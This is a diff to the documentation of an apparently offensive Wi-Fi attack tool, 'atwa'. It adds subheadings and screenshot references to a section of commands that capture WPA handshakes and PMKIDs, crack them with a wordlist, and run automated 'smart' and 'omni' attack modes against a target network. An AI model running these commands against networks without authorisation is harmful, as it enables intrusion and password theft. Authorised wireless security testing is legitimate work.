@@ -41,26 +41,48 @@ If you only see a few targets, you're probably locked. Unlock.
 Stop Attack aborts between rounds. Some vectors finish their current frame first.
 
 ## Captures & cracking
+
+Screenshots (add to `docs/brand/`): `captures-main.png`, `captures-handshake.png`, `captures-pmkid.png`, `captures-crack.png`, `captures-omni.png`.
+
 Captures live in `~/atwa-hs/<SSID>_<BSSID>/`.
 
-Handshake:
+### Handshake capture
+![Handshake capture](brand/captures-handshake.png)
+
 ```bash
 sudo atwa handshake --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6
 sudo atwa verify-handshake ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/handshake-01.cap
 ```
+Captures the 4-way handshake. Verify before cracking.
 
-PMKID:
+### PMKID (clientless)
+![PMKID capture](brand/captures-pmkid.png)
+
 ```bash
 sudo atwa pmkid --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --channel 6
 ```
+Writes `pmkid_*.22000`.
 
-Crack:
+### Cracking
+![Cracking](brand/captures-crack.png)
+
 ```bash
+# From handshake
 sudo atwa crack-cap ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/handshake-01.cap --wordlist rockyou.txt
+
+# From PMKID
 sudo atwa crack ~/atwa-hs/NET_AA:BB:CC:DD:EE:FF/pmkid_*.22000 --wordlist rockyou.txt
 ```
 
-GUI: lock a target with clients, capture, then crack from the Captures panel.
+GUI: lock a target with clients, capture, then crack from the Captures panel. Stop Attack kills the crack subprocess.
+
+### OMNI / Smart
+![OMNI](brand/captures-omni.png)
+
+```bash
+sudo atwa smart --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --ssid NET
+sudo atwa omni --iface wlan1 --bssid AA:BB:CC:DD:EE:FF --ssid NET --wordlist rockyou.txt
+```
 
 ## WPS
 ```bash
